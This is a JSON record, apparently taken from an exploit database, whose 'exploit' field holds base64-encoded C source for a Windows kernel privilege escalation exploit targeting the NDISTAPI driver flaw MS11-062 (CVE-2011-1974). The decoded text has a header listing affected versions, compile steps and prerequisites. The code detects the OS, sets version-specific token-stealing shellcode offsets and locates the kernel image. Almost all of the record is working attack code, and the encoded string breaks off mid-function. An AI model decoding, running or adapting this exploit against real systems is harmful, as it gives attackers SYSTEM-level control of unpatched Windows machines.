{
    "source": "exploit-database", 
    "exploit": "LyoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgRXhwbG9pdCBUaXRsZTogV2luZG93cyB4ODYgKGFsbCB2ZXJzaW9ucykgTkRJU1RBUEkgcHJpdmlsZWdlIGVzY2FsYXRpb24gKE1TMTEtMDYyKQ0KIyBEYXRlOiAyMDE2LTEwLTI0DQojIEV4cGxvaXQgQXV0aG9yOiBUb21pc2xhdiBQYXNrYWxldg0KIyBWdWxuZXJhYmxlIFNvZnR3YXJlOg0KIyAgIFdpbmRvd3MgWFAgU1AzIHg4Ng0KIyAgIFdpbmRvd3MgWFAgUHJvIFNQMiB4NjQNCiMgICBXaW5kb3dzIFNlcnZlciAyMDAzIFNQMiB4ODYNCiMgICBXaW5kb3dzIFNlcnZlciAyMDAzIFNQMiB4NjQNCiMgICBXaW5kb3dzIFNlcnZlciAyMDAzIFNQMiBJdGFuaXVtLWJhc2VkIFN5c3RlbXMgDQojIFN1cHBvcnRlZCBWdWxuZXJhYmxlIFNvZnR3YXJlOg0KIyAgIFdpbmRvd3MgWFAgU1AzIHg4Ng0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDMgU1AyIHg4Ng0KIyBUZXN0ZWQgU29mdHdhcmU6DQojICAgV2luZG93cyBYUCBQcm8gU1AzIHg4NiBFTiAgICAgICAgICBbNS4xLjI2MDBdDQojICAgV2luZG93cyBTZXJ2ZXIgMjAwMyBFbnQgU1AyIEVOICAgICBbNS4yLjM3OTBdDQojIENWRSBJRDogMjAxMS0xOTc0DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIFZ1bG5lcmFiaWxpdHkgZGVzY3JpcHRpb246DQojICAgQW4gZWxldmF0aW9uIG9mIHByaXZpbGVnZSB2dWxuZXJhYmlsaXR5IGV4aXN0cyBpbiB0aGUNCiMgICBORElTVEFQSS5zeXMgY29tcG9uZW50IG9mIHRoZSBSZW1vdGUgQWNjZXNzIFNlcnZpY2UgTkRJU1RBUEkNCiMgICBkcml2ZXIuIFRoZSB2dWxuZXJhYmlsaXR5IGlzIGNhdXNlZCB3aGVuIHRoZSBORElTVEFQSSBkcml2ZXINCiMgICBpbXByb3Blcmx5IHZhbGlkYXRlcyB1c2VyLXN1cHBsaWVkIGlucHV0IHdoZW4gcGFzc2luZyBkYXRhDQojICAgZnJvbSB1c2VyIG1vZGUgdG8gdGhlIFdpbmRvd3Mga2VybmVsLg0KIyAgIEFuIGF0dGFja2VyIG11c3QgaGF2ZSB2YWxpZCBsb2dvbiBjcmVkZW50aWFscyBhbmQgYmUgYWJsZSB0bw0KIyAgIGxvZyBvbiBsb2NhbGx5IHRvIGV4cGxvaXQgdGhlIHZ1bG5lcmFiaWxpdHkuDQojICAgQW4gYXR0YWNrZXIgd2hvIHN1Y2Nlc3NmdWxseSBleHBsb2l0ZWQgdGhpcyB2dWxuZXJhYmlsaXR5IGNvdWxkDQojICAgcnVuIGFyYml0cmFyeSBjb2RlIGluIGtlcm5lbCBtb2RlIChpLmUuIHdpdGggTlQgQVVUSE9SSVRZXFNZU1RFTQ0KIyAgIHByaXZpbGVnZXMpLg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBFeHBsb2l0IG5vdGVzOg0KIyAgIFByaXZpbGVnZWQgc2hlbGwgZXhlY3V0aW9uOg0KIyAgICAgLSB0aGUgU1lTVEVNIHNoZWxsIHdpbGwgc3Bhd24gd2l0aGluIHRoZSBpbnZva2luZyBzaGVsbC9wcm9jZXNzDQojICAgRXhwbG9pdCBjb21waWxpbmcgKEthbGkgR05VL0xpbnV4IFJvbGxpbmcgNjQtYml0KToNCiMgICAgIC0gIyBpNjg2LXc2NC1taW5ndzMyLWdjYyBNUzExLTA2Mi5jIC1vIE1TMTEtMDYyLmV4ZSAtbHdzMl8zMg0KIyAgIEV4cGxvaXQgcHJlcmVxdWlzaXRlczoNCiMgICAgIC0gbG93IHByaXZpbGVnZSBhY2Nlc3MgdG8gdGhlIHRhcmdldCBPUw0KIyAgICAgLSB0YXJnZXQgT1Mgbm90IHBhdGNoZWQgKEtCMjU2NjQ1NCkNCiMgICAgIC0gUmVtb3RlIEFjY2VzcyBTZXJ2aWNlIChSQVMpIHJ1bm5pbmcNCiMgICAgICAgLSBzYyBxdWVyeSByZW1vdGVhY2Nlc3MNCiMgICAgICAgLSBzYyBzdGFydCByZW1vdGVhY2Nlc3MNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgUGF0Y2hlczoNCiMgICBXaW5kb3dzIFhQIFNQMyB4ODYNCiMgICAgIFdpbmRvd3NYUC1LQjI1NjY0NTQteDg2LWVudS5leGUNCiMgICAgICAgKG5vdCBhdmFpbGFibGUgLSBFb0wpDQojICAgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDIgeDg2DQojICAgICBXaW5kb3dzU2VydmVyMjAwMy1LQjI1NjY0NTQteDg2LWVudS5leGUNCiMgICAgICAgaHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9kb3dubG9hZC9kZXRhaWxzLmFzcHg/aWQ9MjcwOTMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgVGhhbmtzIHRvOg0KIyAgIE5pIFRhbyAod3JpdGV1cCkNCiMgICBHb29nbGUgVHJhbnNsYXRlIChDaGluZXNlIC0+IEVuZ3Jpc2gpDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIFJlZmVyZW5jZXM6DQojICAgaHR0cHM6Ly93ZWIubnZkLm5pc3QuZ292L3ZpZXcvdnVsbi9kZXRhaWw/dnVsbklkPUNWRS0yMDExLTE5NzQNCiMgICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTEtMDYyLmFzcHgNCiMgICBodHRwOi8vd3d3LmNhcy5zdGMuc2guY24vanNqeXVwL3BkZi8yMDE1LzUvJUU1JTlGJUJBJUU0JUJBJThFJUU5JTlEJTk5JUU2JTgwJTgxJUU2JUIxJUExJUU3JTgyJUI5JUU1JTg4JTg2JUU2JTlFJTkwJUU2JThBJTgwJUU2JTlDJUFGJUU3JTlBJTg0JUU4JUJEJUFGJUU0JUJCJUI2JUU1JTg2JTg1JUU2JUEwJUI4JUU5JUE5JUIxJUU1JThBJUE4JUU1JUFFJTg5JUU1JTg1JUE4JUU2JTgwJUE3JUU2JUEzJTgwJUU2JUI1JThCLnBkZg0KIyAgIGh0dHBzOi8vdHJhbnNsYXRlLmdvb2dsZS5jb20vDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoqLw0KDQoNCiNpbmNsdWRlIDx3aW5zb2NrMi5oPg0KI2luY2x1ZGUgPHdpbmRvd3MuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHdzMnRjcGlwLmg+DQoNCiNwcmFnbWEgY29tbWVudCAobGliLCAid3MyXzMyLmxpYiIpDQoNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8gREVGSU5FIERBVEEgVFlQRVMNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KdHlwZWRlZiBlbnVtIF9LUFJPRklMRV9TT1VSQ0Ugew0KICAgIFByb2ZpbGVUaW1lLA0KICAgIFByb2ZpbGVBbGlnbm1lbnRGaXh1cCwNCiAgICBQcm9maWxlVG90YWxJc3N1ZXMsDQogICAgUHJvZmlsZVBpcGVsaW5lRHJ5LA0KICAgIFByb2ZpbGVMb2FkSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVQaXBlbGluZUZyb3plbiwNCiAgICBQcm9maWxlQnJhbmNoSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVUb3RhbE5vbmlzc3VlcywNCiAgICBQcm9maWxlRGNhY2hlTWlzc2VzLA0KICAgIFByb2ZpbGVJY2FjaGVNaXNzZXMsDQogICAgUHJvZmlsZUNhY2hlTWlzc2VzLA0KICAgIFByb2ZpbGVCcmFuY2hNaXNwcmVkaWN0aW9ucywNCiAgICBQcm9maWxlU3RvcmVJbnN0cnVjdGlvbnMsDQogICAgUHJvZmlsZUZwSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVJbnRlZ2VySW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGUySXNzdWUsDQogICAgUHJvZmlsZTNJc3N1ZSwNCiAgICBQcm9maWxlNElzc3VlLA0KICAgIFByb2ZpbGVTcGVjaWFsSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVUb3RhbEN5Y2xlcywNCiAgICBQcm9maWxlSWNhY2hlSXNzdWVzLA0KICAgIFByb2ZpbGVEY2FjaGVBY2Nlc3NlcywNCiAgICBQcm9maWxlTWVtb3J5QmFycmllckN5Y2xlcywNCiAgICBQcm9maWxlTG9hZExpbmtlZElzc3VlcywNCiAgICBQcm9maWxlTWF4aW11bQ0KfSBLUFJPRklMRV9TT1VSQ0UsICpQS1BST0ZJTEVfU09VUkNFOw0KDQoNCnR5cGVkZWYgRFdPUkQgKFdJTkFQSSAqUE5UUVVFUllJTlRFUlZBTCkgKA0KICAgIEtQUk9GSUxFX1NPVVJDRSAgIFByb2ZpbGVTb3VyY2UsDQogICAgUFVMT05HICAgICAgICAgICAgSW50ZXJ2YWwNCik7DQoNCg0KdHlwZWRlZiBMT05HIE5UU1RBVFVTOw0KDQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqUE5UQUxMT0NBVEUpICgNCiAgICBIQU5ETEUgICAgICAgICAgICBQcm9jZXNzSGFuZGxlLA0KICAgIFBWT0lEICAgICAgICAgICAgICpCYXNlQWRkcmVzcywNCiAgICBVTE9ORyAgICAgICAgICAgICBaZXJvQml0cywNCiAgICBQVUxPTkcgICAgICAgICAgICBSZWdpb25TaXplLA0KICAgIFVMT05HICAgICAgICAgICAgIEFsbG9jYXRpb25UeXBlLA0KICAgIFVMT05HICAgICAgICAgICAgIFByb3RlY3QNCik7DQoNCg0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gew0KICAgIFVMT05HICAgICAgICAgICAgIFJlc2VydmVkWzJdOw0KICAgIFBWT0lEICAgICAgICAgICAgIEJhc2U7DQogICAgVUxPTkcgICAgICAgICAgICAgU2l6ZTsNCiAgICBVTE9ORyAgICAgICAgICAgICBGbGFnczsNCiAgICBVU0hPUlQgICAgICAgICAgICBJbmRleDsNCiAgICBVU0hPUlQgICAgICAgICAgICBVbmtub3duOw0KICAgIFVTSE9SVCAgICAgICAgICAgIExvYWRDb3VudDsNCiAgICBVU0hPUlQgICAgICAgICAgICBNb2R1bGVOYW1lT2Zmc2V0Ow0KICAgIENIQVIgICAgICAgICAgICAgIEltYWdlTmFtZVsyNTZdOw0KfSBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OLCAqUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT047DQoNCg0KdHlwZWRlZiBCT09MIChXSU5BUEkgKkxQRk5fSVNXT1c2NFBST0NFU1MpIChIQU5ETEUsIFBCT09MKTsNCg0KDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLyBGVU5DVElPTlMNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KQk9PTCBJc1dvdzY0KCkNCnsNCiAgICBCT09MIGJJc1dvdzY0ID0gRkFMU0U7DQogICAgTFBGTl9JU1dPVzY0UFJPQ0VTUyBmbklzV293NjRQcm9jZXNzOw0KDQogICAgZm5Jc1dvdzY0UHJvY2VzcyA9IChMUEZOX0lTV09XNjRQUk9DRVNTKSBHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoVEVYVCgia2VybmVsMzIiKSksICJJc1dvdzY0UHJvY2VzcyIpOw0KDQogICAgaWYoTlVMTCAhPSBmbklzV293NjRQcm9jZXNzKQ0KICAgIHsNCiAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODQxMzkodj12cy44NSkuYXNweA0KICAgICAgICBpZiAoIWZuSXNXb3c2NFByb2Nlc3MoR2V0Q3VycmVudFByb2Nlc3MoKSwgJmJJc1dvdzY0KSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODEzODEodj12cy44NSkuYXNweA0KICAgICAgICAgICAgcHJpbnRmKCIgICBbLV0gRmFpbGVkIChlcnJvciBjb2RlOiAlZClcbiIsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gYklzV293NjQ7DQp9DQoNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8gTUFJTiBGVU5DVElPTg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQppbnQgbWFpbih2b2lkKQ0Kew0KICAgIHByaW50ZigiWypdIE1TMTEtMDYyIChDVkUtMjAxMS0xOTc0KSB4ODYgZXhwbG9pdFxuIik7DQogICAgcHJpbnRmKCIgICBbKl0gYnkgVG9taXNsYXYgUGFza2FsZXZcbiIpOw0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gSURFTlRJRlkgVEFSR0VUIE9TIEFSQ0hJVEVDVFVSRSBBTkQgVkVSU0lPTg0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgIHByaW50ZigiWypdIElkZW50aWZ5aW5nIE9TXG4iKTsNCg0KDQogICAgLy8gaWRlbnRpZnkgdGFyZ2V0IG1hY2hpbmUncyBPUyBhcmNoaXRlY3R1cmUNCiAgICAvLyBpbiBjYXNlIHRoZSB0YXJnZXQgbWFjaGluZSBpcyBydW5uaW5nIGEgNjQtYml0IE9TDQogICAgaWYoSXNXb3c2NCgpKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIgICBbLV0gNjQtYml0XG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIHByaW50ZigiICAgWytdIDMyLWJpdFxuIik7DQoNCg0KICAgIC8vIGlkZW50aWZ5IHRhcmdldCBtYWNoaW5lJ3MgT1MgdmVyc2lvbg0KICAgIC8vIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNzI0NDUxKHY9dnMuODUpLmFzcHgNCiAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczcyNDgzMih2PXZzLjg1KS5hc3B4DQogICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM3MjQ4MzModj12cy44NSkuYXNweA0KICAgIE9TVkVSU0lPTklORk9FWCBvc3ZpOw0KICAgIFplcm9NZW1vcnkoJm9zdmksIHNpemVvZihPU1ZFUlNJT05JTkZPRVgpKTsNCiAgICBvc3ZpLmR3T1NWZXJzaW9uSW5mb1NpemUgPSBzaXplb2YoT1NWRVJTSU9OSU5GT0VYKTsNCiAgICBHZXRWZXJzaW9uRXgoKExQT1NWRVJTSU9OSU5GTykgJm9zdmkpOw0KDQogICAgLy8gZGVmaW5lIG9wZXJhdGluZyBzeXN0ZW0gdmVyc2lvbiBzcGVjaWZpYyB2YXJpYWJsZXMNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZV9LUFJPQ0VTUzsNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZV9UT0tFTjsNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZV9VUElEOw0KICAgIHVuc2lnbmVkIGNoYXIgc2hlbGxjb2RlX0FQTElOS1M7DQogICAgY29uc3QgY2hhciAqKnNlY3VyaXR5UGF0Y2hlc1B0cjsNCiAgICBpbnQgc2VjdXJpdHlQYXRjaGVzQ291bnQ7DQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLyoNCiAgICBPUyBWRVJTSU9OIFNQRUNJRklDIE9GRlNFVFMNCg0KICAgIHJlZmVyZW5jZXM6DQogICAgICBodHRwOi8vd3d3Lmdlb2ZmY2hhcHBlbGwuY29tL3N0dWRpZXMvd2luZG93cy9rbS9udG9za3JubC9zdHJ1Y3RzL2t0aHJlYWQvb3JpZ2luYWwuaHRtDQogICAgICBodHRwOi8vd3d3Lmdlb2ZmY2hhcHBlbGwuY29tL3N0dWRpZXMvd2luZG93cy9rbS9udG9za3JubC9zdHJ1Y3RzL2t0aHJlYWQvbGF0ZTUyLmh0bQ0KICAgICAgaHR0cDovL3d3dy5nZW9mZmNoYXBwZWxsLmNvbS9zdHVkaWVzL3dpbmRvd3Mva20vbnRvc2tybmwvc3RydWN0cy9rdGhyZWFkL2N1cnJlbnQuaHRtDQogICAgICBodHRwOi8vd3d3Lmdlb2ZmY2hhcHBlbGwuY29tL3N0dWRpZXMvd2luZG93cy9rbS9udG9za3JubC9zdHJ1Y3RzL2Vwcm9jZXNzLw0KICAgICovDQogICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQogICAgLy8gaW4gY2FzZSB0aGUgT1MgdmVyc2lvbiBpcyA1LjEsIHNlcnZpY2UgcGFjayAzDQogICAgaWYoKG9zdmkuZHdNYWpvclZlcnNpb24gPT0gNSkgJiYgKG9zdmkuZHdNaW5vclZlcnNpb24gPT0gMSkgJiYgKG9zdmkud1NlcnZpY2VQYWNrTWFqb3IgPT0gMykpDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBXaW5kb3dzIFhQIFNQMw0KICAgICAgICBwcmludGYoIiAgIFsrXSBXaW5kb3dzIFhQIFNQM1xuIik7DQogICAgICAgIHNoZWxsY29kZV9LUFJPQ0VTUyA9ICdceDQ0JzsNCiAgICAgICAgc2hlbGxjb2RlX1RPS0VOICAgID0gJ1x4QzgnOw0KICAgICAgICBzaGVsbGNvZGVfVVBJRCAgICAgPSAnXHg4NCc7DQogICAgICAgIHNoZWxsY29kZV9BUExJTktTICA9ICdceDg4JzsNCiAgICAgICAgY29uc3QgY2hhciAqc2VjdXJpdHlQYXRjaGVzW10gPSB7IktCMjU2NjQ1NCJ9Ow0KICAgICAgICBzZWN1cml0eVBhdGNoZXNQdHIgPSBzZWN1cml0eVBhdGNoZXM7DQogICAgICAgIHNlY3VyaXR5UGF0Y2hlc0NvdW50ID0gMTsNCiAgICB9DQoNCiAgICAvLyBpbiBjYXNlIHRoZSBPUyB2ZXJzaW9uIGlzIDUuMiwgc2VydmljZSBwYWNrIDIsIG5vdCBSMg0KICAgIC8vICAgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM3MjQzODUodj12cy44NSkuYXNweA0KICAgIGVsc2UgaWYoKG9zdmkuZHdNYWpvclZlcnNpb24gPT0gNSkgJiYgKG9zdmkuZHdNaW5vclZlcnNpb24gPT0gMikgJiYgKG9zdmkud1NlcnZpY2VQYWNrTWFqb3IgPT0gMikgJiYgKEdldFN5c3RlbU1ldHJpY3MoODkpID09IDApKQ0KICAgIHsNCiAgICAgICAgLy8gdGhlIHRhcmdldCBtYWNoaW5lJ3MgT1MgaXMgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDINCiAgICAgICAgcHJpbnRmKCIgICBbK10gV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDJcbiIpOw0KICAgICAgICBzaGVsbGNvZGVfS1BST0NFU1MgPSAnXHgzOCc7DQogICAgICAgIHNoZWxsY29kZV9UT0tFTiAgICA9ICdceEQ4JzsNCiAgICAgICAgc2hlbGxjb2RlX1VQSUQgICAgID0gJ1x4OTQnOw0KICAgICAgICBzaGVsbGNvZGVfQVBMSU5LUyAgPSAnXHg5OCc7DQogICAgICAgIGNvbnN0IGNoYXIgKnNlY3VyaXR5UGF0Y2hlc1tdID0geyJLQjI1NjY0NTQifTsNCiAgICAgICAgc2VjdXJpdHlQYXRjaGVzUHRyID0gc2VjdXJpdHlQYXRjaGVzOw0KICAgICAgICBzZWN1cml0eVBhdGNoZXNDb3VudCA9IDE7DQogICAgfQ0KDQogICAgLy8gaW4gY2FzZSB0aGUgT1MgdmVyc2lvbiBpcyBub3QgYW55IG9mIHRoZSBwcmV2aW91c2x5IGNoZWNrZWQgdmVyc2lvbnMNCiAgICBlbHNlDQogICAgew0KICAgICAgICAvLyB0aGUgdGFyZ2V0IG1hY2hpbmUncyBPUyBpcyBhbiB1bnN1cHBvcnRlZCAzMi1iaXQgV2luZG93cyB2ZXJzaW9uDQogICAgICAgIHByaW50ZigiICAgWy1dIFVuc3VwcG9ydGVkIHZlcnNpb25cbiIpOw0KICAgICAgICBwcmludGYoIiAgICAgIFsqXSBBZmZlY3RlZCAzMi1iaXQgb3BlcmF0aW5nIHN5c3RlbXNcbiIpOw0KICAgICAgICBwcmludGYoIiAgICAgICAgIFsqXSBXaW5kb3dzIFhQIFNQM1xuIik7DQogICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFdpbmRvd3MgU2VydmVyIDIwMDMgU1AyXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KDQogICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KICAgIC8vIExPQ0FURSBSRVFVSVJFRCBPUyBDT01QT05FTlRTDQogICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQogICAgcHJpbnRmKCJbKl0gTG9jYXRpbmcgcmVxdWlyZWQgT1MgY29tcG9uZW50c1xuIik7DQoNCg0KICAgIC8vIHJldHJpZXZlIHN5c3RlbSBpbmZvcm1hdGlvbg0KICAgIC8vICAgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM3MjU1MDYodj12cy44NSkuYXNweA0KICAgIC8vIGxvY2F0ZSAiWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uIiBpbiB0aGUgIm50ZGxsLmRsbCIgbW9kdWxlDQogICAgLy8gICBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY4MzIxMih2PXZzLjg1KS5hc3B4DQogICAgRkFSUFJPQyBad1F1ZXJ5U3lzdGVtSW5mb3JtYXRpb247DQogICAgWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uID0gR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIlp3UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiIpOw0KDQogICAgLy8gMTEgPSBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbg0KICAgIC8vICAgaHR0cDovL3dpbmZvcm14LmZsb3JpYW4tcmFwcGwuZGUvaHRtbC9lNmQ1ZDVjMS04ZDgzLTE5OWItMDA0Zi04NzY3NDM5YzcwZWIuaHRtDQogICAgVUxPTkcgc3lzdGVtSW5mb3JtYXRpb247DQogICAgWndRdWVyeVN5c3RlbUluZm9ybWF0aW9uKDExLCAoUFZPSUQpICZzeXN0ZW1JbmZvcm1hdGlvbiwgMCwgJnN5c3RlbUluZm9ybWF0aW9uKTsNCg0KICAgIC8vIGFsbG9jYXRlIG1lbW9yeSBmb3IgdGhlIGxpc3Qgb2YgbG9hZGVkIG1vZHVsZXMNCiAgICBVTE9ORyAqc3lzdGVtSW5mb3JtYXRpb25CdWZmZXI7DQogICAgc3lzdGVtSW5mb3JtYXRpb25CdWZmZXIgPSAoVUxPTkcgKikgbWFsbG9jKHN5c3RlbUluZm9ybWF0aW9uICogc2l6ZW9mKCpzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlcikpOw0KDQogICAgaWYoIXN5c3RlbUluZm9ybWF0aW9uQnVmZmVyKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIgICBbLV0gQ291bGQgbm90IGFsbG9jYXRlIG1lbW9yeSIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQoNCiAgICAvLyByZXRyaWV2ZSB0aGUgbGlzdCBvZiBsb2FkZWQgbW9kdWxlcyANCiAgICBad1F1ZXJ5U3lzdGVtSW5mb3JtYXRpb24oMTEsIHN5c3RlbUluZm9ybWF0aW9uQnVmZmVyLCBzeXN0ZW1JbmZvcm1hdGlvbiAqIHNpemVvZigqc3lzdGVtSW5mb3JtYXRpb25CdWZmZXIpLCBOVUxMKTsNCg0KICAgIC8vIGxvY2F0ZSAibnRrcm5scGEuZXhlIiBvciAibnRvc2tybmwuZXhlIiBpbiB0aGUgcmV0cmlldmVkIGxpc3Qgb2YgbG9hZGVkIG1vZHVsZXMNCiAgICBVTE9ORyBpOw0KICAgIFBWT0lEIHRhcmdldEtybmxNZGxCYXNlQWRkcjsNCiAgICBITU9EVUxFIHRhcmdldEtybmxNZGxVc3JTcGNPZmZzOw0KICAgIEJPT0wgZm91bmRNb2R1bGUgPSBGQUxTRTsNCiAgICBQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiBsb2FkZWRNZGxTdHJ1Y3RQdHI7DQogICAgbG9hZGVkTWRsU3RydWN0UHRyID0gKFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OKSAoc3lzdGVtSW5mb3JtYXRpb25CdWZmZXIgKyAxKTsNCg0KICAgIGZvcihpID0gMDsgaSA8ICpzeXN0ZW1JbmZvcm1hdGlvbkJ1ZmZlcjsgaSsrKQ0KICAgIHsNCiAgICAgICAgaWYoc3Ryc3RyKGxvYWRlZE1kbFN0cnVjdFB0cltpXS5JbWFnZU5hbWUsICJudGtybmxwYS5leGUiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcHJpbnRmKCIgICBbK10gbnRrcm5scGEuZXhlXG4iKTsNCiAgICAgICAgICAgIHRhcmdldEtybmxNZGxVc3JTcGNPZmZzID0gTG9hZExpYnJhcnlFeEEoIm50a3JubHBhLmV4ZSIsIDAsIDEpOw0KICAgICAgICAgICAgdGFyZ2V0S3JubE1kbEJhc2VBZGRyID0gbG9hZGVkTWRsU3RydWN0UHRyW2ldLkJhc2U7DQogICAgICAgICAgICBmb3VuZE1vZHVsZSA9IFRSVUU7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgfSAgICANCiAgICAgICAgZWxzZSBpZihzdHJzdHIobG9hZGVkTWRsU3RydWN0UHRyW2ldLkltYWdlTmFtZSwgIm50b3Nrcm5sLmV4ZSIpKQ0KICAgICAgICB7DQogICAgICAgICAgICBwcmludGYoIiAgIFsrXSBudG9za3JubC5leGVcbiIpOw0KICAgICAgICAgICAgdGFyZ2V0S3JubE1kbFVzclNwY09mZnMgPSBMb2FkTGlicmFyeUV4QSgibnRvc2tybmwuZXhlIiwgMCwgMSk7DQogICAgICAgICAgICB0YXJnZXRLcm5sTWRsQmFzZUFkZHIgPSBsb2FkZWRNZGxTdHJ1Y3RQdHJbaV0uQmFzZTsNCiAgICAgICAgICAgIGZvdW5kTW9kdWxlID0gVFJVRTsNCiAgICAgICAg